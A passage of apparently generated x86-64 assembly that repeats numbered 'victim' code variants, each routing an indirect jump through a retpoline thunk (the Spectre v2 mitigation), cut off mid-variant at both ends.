	jmp	.Lgg_retpol_after_000023
.Lgg_retpol_thunk_000023:
	callq	.Lgg_retpol_setup_000023
.Lgg_retpol_cap_000023:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000023
.Lgg_retpol_setup_000023:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000023:
	jmp	.Lvictim_win0_continue
## Variant 24
.Lvictim_win0_var24:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000024
	jmp	.Lgg_retpol_after_000024
.Lgg_retpol_thunk_000024:
	callq	.Lgg_retpol_setup_000024
.Lgg_retpol_cap_000024:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000024
.Lgg_retpol_setup_000024:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000024:
	jmp	.Lvictim_win0_continue
## Variant 25
.Lvictim_win0_var25:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000025
	jmp	.Lgg_retpol_after_000025
.Lgg_retpol_thunk_000025:
	callq	.Lgg_retpol_setup_000025
.Lgg_retpol_cap_000025:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000025
.Lgg_retpol_setup_000025:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000025:
	jmp	.Lvictim_win0_continue
## Variant 26
.Lvictim_win0_var26:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000026
	jmp	.Lgg_retpol_after_000026
.Lgg_retpol_thunk_000026:
	callq	.Lgg_retpol_setup_000026
.Lgg_retpol_cap_000026:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000026
.Lgg_retpol_setup_000026:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000026:
	jmp	.Lvictim_win0_continue
## Variant 27
.Lvictim_win0_var27:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000027
	jmp	.Lgg_retpol_after_000027
.Lgg_retpol_thunk_000027:
	callq	.Lgg_retpol_setup_000027
.Lgg_retpol_cap_000027:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000027
.Lgg_retpol_setup_000027:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000027:
	jmp	.Lvictim_win0_continue
## Variant 28
.Lvictim_win0_var28:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000028
	jmp	.Lgg_retpol_after_000028
.Lgg_retpol_thunk_000028:
	callq	.Lgg_retpol_setup_000028
.Lgg_retpol_cap_000028:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000028
.Lgg_retpol_setup_000028:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000028:
	jmp	.Lvictim_win0_continue
## Variant 29
.Lvictim_win0_var29:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000029
	jmp	.Lgg_retpol_after_000029
.Lgg_retpol_thunk_000029:
	callq	.Lgg_retpol_setup_000029
.Lgg_retpol_cap_000029:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000029
.Lgg_retpol_setup_000029:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000029:
	jmp	.Lvictim_win0_continue
## Variant 30
.Lvictim_win0_var30:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000030
	jmp	.Lgg_retpol_after_000030
.Lgg_retpol_thunk_000030:
	callq	.Lgg_retpol_setup_000030
.Lgg_retpol_cap_000030:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000030
.Lgg_retpol_setup_000030:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000030:
	jmp	.Lvictim_win0_continue
## Variant 31
.Lvictim_win0_var31:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000031
	jmp	.Lgg_retpol_after_000031
.Lgg_retpol_thunk_000031:
	callq	.Lgg_retpol_setup_000031
.Lgg_retpol_cap_000031:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000031
.Lgg_retpol_setup_000031:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000031:
	jmp	.Lvictim_win0_continue
## Variant 32
.Lvictim_win0_var32:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000032
	jmp	.Lgg_retpol_after_000032
.Lgg_retpol_thunk_000032:
	callq	.Lgg_retpol_setup_000032
.Lgg_retpol_cap_000032:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000032
.Lgg_retpol_setup_000032:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000032:
	jmp	.Lvictim_win0_continue
## Variant 33
.Lvictim_win0_var33:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000033
	jmp	.Lgg_retpol_after_000033
.Lgg_retpol_thunk_000033:
	callq	.Lgg_retpol_setup_000033
.Lgg_retpol_cap_000033:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000033
.Lgg_retpol_setup_000033:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000033:
	jmp	.Lvictim_win0_continue
## Variant 34
.Lvictim_win0_var34:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000034
	jmp	.Lgg_retpol_after_000034
.Lgg_retpol_thunk_000034:
	callq	.Lgg_retpol_setup_000034
.Lgg_retpol_cap_000034:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000034
.Lgg_retpol_setup_000034:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000034:
	jmp	.Lvictim_win0_continue
## Variant 35
.Lvictim_win0_var35:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000035
	jmp	.Lgg_retpol_after_000035
.Lgg_retpol_thunk_000035:
	callq	.Lgg_retpol_setup_000035
.Lgg_retpol_cap_000035:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000035
.Lgg_retpol_setup_000035:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000035:
	jmp	.Lvictim_win0_continue
## Variant 36
.Lvictim_win0_var36:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000036
	jmp	.Lgg_retpol_after_000036
.Lgg_retpol_thunk_000036:
	callq	.Lgg_retpol_setup_000036
.Lgg_retpol_cap_000036:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000036
.Lgg_retpol_setup_000036:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000036:
	jmp	.Lvictim_win0_continue
## Variant 37
.Lvictim_win0_var37:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000037
	jmp	.Lgg_retpol_after_000037
.Lgg_retpol_thunk_000037:
	callq	.Lgg_retpol_setup_000037
.Lgg_retpol_cap_000037:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000037
.Lgg_retpol_setup_000037:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000037:
	jmp	.Lvictim_win0_continue
## Variant 38
.Lvictim_win0_var38:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000038
	jmp	.Lgg_retpol_after_000038
.Lgg_retpol_thunk_000038:
	callq	.Lgg_retpol_setup_000038
.Lgg_retpol_cap_000038:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000038
.Lgg_retpol_setup_000038:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000038:
	jmp	.Lvictim_win0_continue
## Variant 39
.Lvictim_win0_var39:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000039
	jmp	.Lgg_retpol_after_000039
.Lgg_retpol_thunk_000039:
	callq	.Lgg_retpol_setup_000039
.Lgg_retpol_cap_000039:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000039
.Lgg_retpol_setup_000039:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000039:
	jmp	.Lvictim_win0_continue
## Variant 40
.Lvictim_win0_var40:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000040
	jmp	.Lgg_retpol_after_000040
.Lgg_retpol_thunk_000040:
	callq	.Lgg_retpol_setup_000040
.Lgg_retpol_cap_000040:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000040
.Lgg_retpol_setup_000040:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000040:
	jmp	.Lvictim_win0_continue
## Variant 41
.Lvictim_win0_var41:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000041
	jmp	.Lgg_retpol_after_000041
.Lgg_retpol_thunk_000041:
	callq	.Lgg_retpol_setup_000041
.Lgg_retpol_cap_000041:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000041
.Lgg_retpol_setup_000041:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000041:
	jmp	.Lvictim_win0_continue
## Variant 42
.Lvictim_win0_var42:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000042
	jmp	.Lgg_retpol_after_000042
.Lgg_retpol_thunk_000042:
	callq	.Lgg_retpol_setup_000042
.Lgg_retpol_cap_000042:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000042
.Lgg_retpol_setup_000042:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000042:
	jmp	.Lvictim_win0_continue
## Variant 43
.Lvictim_win0_var43:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000043
	jmp	.Lgg_retpol_after_000043
.Lgg_retpol_thunk_000043:
	callq	.Lgg_retpol_setup_000043
.Lgg_retpol_cap_000043:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000043
.Lgg_retpol_setup_000043:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000043:
	jmp	.Lvictim_win0_continue
## Variant 44
.Lvictim_win0_var44:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000044
	jmp	.Lgg_retpol_after_000044
.Lgg_retpol_thunk_000044:
	callq	.Lgg_retpol_setup_000044
.Lgg_retpol_cap_000044:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000044
.Lgg_retpol_setup_000044:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000044:
	jmp	.Lvictim_win0_continue
## Variant 45
.Lvictim_win0_var45:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000045
	jmp	.Lgg_retpol_after_000045
.Lgg_retpol_thunk_000045:
	callq	.Lgg_retpol_setup_000045
.Lgg_retpol_cap_000045:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000045
.Lgg_retpol_setup_000045:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000045:
	jmp	.Lvictim_win0_continue
## Variant 46
.Lvictim_win0_var46:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000046
	jmp	.Lgg_retpol_after_000046
.Lgg_retpol_thunk_000046:
	callq	.Lgg_retpol_setup_000046
.Lgg_retpol_cap_000046:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000046
.Lgg_retpol_setup_000046:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000046:
	jmp	.Lvictim_win0_continue
## Variant 47
.Lvictim_win0_var47:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000047
	jmp	.Lgg_retpol_after_000047
.Lgg_retpol_thunk_000047:
	callq	.Lgg_retpol_setup_000047
.Lgg_retpol_cap_000047:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000047
.Lgg_retpol_setup_000047:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000047:
	jmp	.Lvictim_win0_continue
## Variant 48
.Lvictim_win0_var48:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000048
	jmp	.Lgg_retpol_after_000048
.Lgg_retpol_thunk_000048:
	callq	.Lgg_retpol_setup_000048
.Lgg_retpol_cap_000048:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000048
.Lgg_retpol_setup_000048:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000048:
	jmp	.Lvictim_win0_continue
## Variant 49
.Lvictim_win0_var49:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000049
	jmp	.Lgg_retpol_after_000049
.Lgg_retpol_thunk_000049:
	callq	.Lgg_retpol_setup_000049
.Lgg_retpol_cap_000049:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000049
.Lgg_retpol_setup_000049:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000049:
	jmp	.Lvictim_win0_continue
## Variant 50
.Lvictim_win0_var50:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000050
	jmp	.Lgg_retpol_after_000050
.Lgg_retpol_thunk_000050:
	callq	.Lgg_retpol_setup_000050
.Lgg_retpol_cap_000050:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000050
.Lgg_retpol_setup_000050:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000050:
	jmp	.Lvictim_win0_continue
## Variant 51
.Lvictim_win0_var51:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000051
	jmp	.Lgg_retpol_after_000051
.Lgg_retpol_thunk_000051:
	callq	.Lgg_retpol_setup_000051
.Lgg_retpol_cap_000051:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000051
.Lgg_retpol_setup_000051:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000051:
	jmp	.Lvictim_win0_continue
## Variant 52
.Lvictim_win0_var52:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000052
	jmp	.Lgg_retpol_after_000052
.Lgg_retpol_thunk_000052:
	callq	.Lgg_retpol_setup_000052
.Lgg_retpol_cap_000052:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000052
.Lgg_retpol_setup_000052:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000052:
	jmp	.Lvictim_win0_continue
## Variant 53
.Lvictim_win0_var53:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000053
	jmp	.Lgg_retpol_after_000053
.Lgg_retpol_thunk_000053:
	callq	.Lgg_retpol_setup_000053
.Lgg_retpol_cap_000053:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000053
.Lgg_retpol_setup_000053:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000053:
	jmp	.Lvictim_win0_continue
## Variant 54
.Lvictim_win0_var54:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000054
	jmp	.Lgg_retpol_after_000054
.Lgg_retpol_thunk_000054:
	callq	.Lgg_retpol_setup_000054
.Lgg_retpol_cap_000054:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000054
.Lgg_retpol_setup_000054:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000054:
	jmp	.Lvictim_win0_continue
## Variant 55
.Lvictim_win0_var55:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000055
	jmp	.Lgg_retpol_after_000055
.Lgg_retpol_thunk_000055:
	callq	.Lgg_retpol_setup_000055
.Lgg_retpol_cap_000055:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000055
.Lgg_retpol_setup_000055:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000055:
	jmp	.Lvictim_win0_continue
## Variant 56
.Lvictim_win0_var56:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000056
	jmp	.Lgg_retpol_after_000056
.Lgg_retpol_thunk_000056:
	callq	.Lgg_retpol_setup_000056
.Lgg_retpol_cap_000056:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000056
.Lgg_retpol_setup_000056:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000056:
	jmp	.Lvictim_win0_continue
## Variant 57
.Lvictim_win0_var57:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000057
	jmp	.Lgg_retpol_after_000057
.Lgg_retpol_thunk_000057:
	callq	.Lgg_retpol_setup_000057
.Lgg_retpol_cap_000057:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000057
.Lgg_retpol_setup_000057:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000057:
	jmp	.Lvictim_win0_continue
## Variant 58
.Lvictim_win0_var58:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000058
	jmp	.Lgg_retpol_after_000058
.Lgg_retpol_thunk_000058:
	callq	.Lgg_retpol_setup_000058
.Lgg_retpol_cap_000058:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000058
.Lgg_retpol_setup_000058:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000058:
	jmp	.Lvictim_win0_continue
## Variant 59
.Lvictim_win0_var59:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000059
	jmp	.Lgg_retpol_after_000059
.Lgg_retpol_thunk_000059:
	callq	.Lgg_retpol_setup_000059
.Lgg_retpol_cap_000059:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000059
.Lgg_retpol_setup_000059:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000059:
	jmp	.Lvictim_win0_continue
## Variant 60
.Lvictim_win0_var60:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000060
	jmp	.Lgg_retpol_after_000060
.Lgg_retpol_thunk_000060:
	callq	.Lgg_retpol_setup_000060
.Lgg_retpol_cap_000060:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000060
.Lgg_retpol_setup_000060:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000060:
	jmp	.Lvictim_win0_continue
## Variant 61
.Lvictim_win0_var61:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000061
	jmp	.Lgg_retpol_after_000061
.Lgg_retpol_thunk_000061:
	callq	.Lgg_retpol_setup_000061
.Lgg_retpol_cap_000061:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000061
.Lgg_retpol_setup_000061:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000061:
	jmp	.Lvictim_win0_continue
## Variant 62
.Lvictim_win0_var62:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000062
	jmp	.Lgg_retpol_after_000062
.Lgg_retpol_thunk_000062:
	callq	.Lgg_retpol_setup_000062
.Lgg_retpol_cap_000062:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000062
.Lgg_retpol_setup_000062:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000062:
	jmp	.Lvictim_win0_continue
## Variant 63
.Lvictim_win0_var63:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000063
	jmp	.Lgg_retpol_after_000063
.Lgg_retpol_thunk_000063:
	callq	.Lgg_retpol_setup_000063
.Lgg_retpol_cap_000063:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000063
.Lgg_retpol_setup_000063:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000063:
	jmp	.Lvictim_win0_continue
## Variant 64
.Lvictim_win0_var64:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000064
	jmp	.Lgg_retpol_after_000064
.Lgg_retpol_thunk_000064:
	callq	.Lgg_retpol_setup_000064
.Lgg_retpol_cap_000064:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000064
.Lgg_retpol_setup_000064:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000064:
	jmp	.Lvictim_win0_continue
## Variant 65
.Lvictim_win0_var65:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000065
	jmp	.Lgg_retpol_after_000065
.Lgg_retpol_thunk_000065:
	callq	.Lgg_retpol_setup_000065
.Lgg_retpol_cap_000065:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000065
.Lgg_retpol_setup_000065:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000065:
	jmp	.Lvictim_win0_continue
## Variant 66
.Lvictim_win0_var66:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000066
	jmp	.Lgg_retpol_after_000066
.Lgg_retpol_thunk_000066:
	callq	.Lgg_retpol_setup_000066
.Lgg_retpol_cap_000066:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000066
.Lgg_retpol_setup_000066:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000066:
	jmp	.Lvictim_win0_continue
## Variant 67
.Lvictim_win0_var67:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000067
	jmp	.Lgg_retpol_after_000067
.Lgg_retpol_thunk_000067:
	callq	.Lgg_retpol_setup_000067
.Lgg_retpol_cap_000067:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000067
.Lgg_retpol_setup_000067:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000067:
	jmp	.Lvictim_win0_continue
## Variant 68
.Lvictim_win0_var68:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000068
	jmp	.Lgg_retpol_after_000068
.Lgg_retpol_thunk_000068:
	callq	.Lgg_retpol_setup_000068
.Lgg_retpol_cap_000068:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000068
.Lgg_retpol_setup_000068:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000068:
	jmp	.Lvictim_win0_continue
## Variant 69
.Lvictim_win0_var69:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000069
	jmp	.Lgg_retpol_after_000069
.Lgg_retpol_thunk_000069:
	callq	.Lgg_retpol_setup_000069
.Lgg_retpol_cap_000069:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000069
.Lgg_retpol_setup_000069:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000069:
	jmp	.Lvictim_win0_continue
## Variant 70
.Lvictim_win0_var70:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000070
	jmp	.Lgg_retpol_after_000070
.Lgg_retpol_thunk_000070:
	callq	.Lgg_retpol_setup_000070
.Lgg_retpol_cap_000070:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000070
.Lgg_retpol_setup_000070:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000070:
	jmp	.Lvictim_win0_continue
## Variant 71
.Lvictim_win0_var71:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000071
	jmp	.Lgg_retpol_after_000071
.Lgg_retpol_thunk_000071:
	callq	.Lgg_retpol_setup_000071
.Lgg_retpol_cap_000071:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000071
.Lgg_retpol_setup_000071:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000071:
	jmp	.Lvictim_win0_continue
## Variant 72
.Lvictim_win0_var72:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000072
	jmp	.Lgg_retpol_after_000072
.Lgg_retpol_thunk_000072:
	callq	.Lgg_retpol_setup_000072
.Lgg_retpol_cap_000072:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000072
.Lgg_retpol_setup_000072:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000072:
	jmp	.Lvictim_win0_continue
## Variant 73
.Lvictim_win0_var73:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000073
	jmp	.Lgg_retpol_after_000073
.Lgg_retpol_thunk_000073:
	callq	.Lgg_retpol_setup_000073
.Lgg_retpol_cap_000073:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000073
.Lgg_retpol_setup_000073:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000073:
	jmp	.Lvictim_win0_continue
## Variant 74
.Lvictim_win0_var74:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000074
	jmp	.Lgg_retpol_after_000074
.Lgg_retpol_thunk_000074:
	callq	.Lgg_retpol_setup_000074
.Lgg_retpol_cap_000074:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000074
.Lgg_retpol_setup_000074:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000074:
	jmp	.Lvictim_win0_continue
## Variant 75
.Lvictim_win0_var75:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000075
	jmp	.Lgg_retpol_after_000075
.Lgg_retpol_thunk_000075:
	callq	.Lgg_retpol_setup_000075
.Lgg_retpol_cap_000075:
